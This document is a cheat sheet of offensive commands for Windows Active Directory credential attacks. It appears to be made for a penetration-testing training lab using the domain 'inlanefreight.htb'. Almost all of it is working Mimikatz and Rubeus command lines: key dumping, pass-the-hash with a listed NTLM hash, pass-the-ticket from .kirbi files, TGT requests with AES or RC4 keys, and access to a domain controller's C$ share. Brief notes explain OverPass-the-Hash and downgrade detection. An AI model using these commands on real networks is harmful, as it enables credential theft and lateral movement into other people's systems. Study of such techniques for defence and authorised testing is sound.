# MIMIKATZ EXTRACT KEYS
```
mimikatz.exe
privilege::debug
sekurlsa::ekeys
```


# MIMIKATZ PTH (NEEDS ROOT, NEEDS RC4/NTLM KEY, CAN BE LOGGED SINCE SERVER 2008, OPENS NEW SESSION)
```
mimikatz.exe
privilege::debug
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f /run:powershell.exe
```


# MIMIKATZ PTT (NEEDS .KIRBI FILE)
```
mimikatz.exe
```
```
privilege::debug
kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
exit
```
```
dir \\DC01.inlanefreight.htb\c$
```


# RUBEUS DEMAND A TGT AND SHOW IT IN BASE64 (NO ROOT NEEDED)
```
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
```


# RUBEUS PTT (NO ROOT NEEDED, IN THIS SESSION)
```
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
```


# RUBEUS PTT IMPORT TICKET FROM .KIRBI FILE (NO ROOT NEEDED, IN THIS SESSION)
```
Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
dir \\DC01.inlanefreight.htb\c$
```


# CONVERT .KIRBI FILE TO BASE64 (NO ROOT NEEDED, IN THIS SESSION)
```
PS [Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```
## RUBEUS PTT USING BASE64 ENCODED .KIRBI FILE (NO ROOT NEEDED, IN THIS SESSION)
```
Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzMRY2pzSrk/gHuER2XRLdV/...SNIP...
```







# INFO
- The Pass the Key aka. OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full Ticket Granting Ticket (TGT).

- Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use an rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an "encryption downgrade." 

- Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.

- Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module misc to launch a new command prompt window with the imported ticket using the misc::cmd command.






